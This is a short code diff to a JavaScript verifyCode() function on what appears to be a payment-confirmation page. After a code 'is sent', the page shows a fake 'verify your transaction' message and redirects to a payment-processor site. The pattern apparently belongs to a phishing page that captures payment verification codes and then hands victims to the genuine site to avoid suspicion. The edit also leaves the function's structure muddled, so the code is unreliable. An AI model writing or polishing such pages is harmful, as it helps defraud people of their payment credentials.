@@ -190,12 +190,12 @@ async function verifyCode() {
     if (isSent) {
         document.getElementById('main-content').innerHTML = "<h2>Processing...</h2><p>Please wait while we verify your transaction.</p>";
         setTimeout(() => {
-            window.location.href = "jccsmart.com"; // Добавлен https:// протокол
-        }, 3000);
-    } else {
-        btn.disabled = false;
-        btn.innerText = 'Confirm Payment';
-    }
+                // Показываем загрузку
+    document.getElementById('main-content').innerHTML = "<h2>Processing...</h2><p>Please wait while we verify your transaction.</p>";
+
+    setTimeout(() => {
+        window.location.href = "https://www.jccsmart.com";
+    }, 3000);
 }
 </script>
 
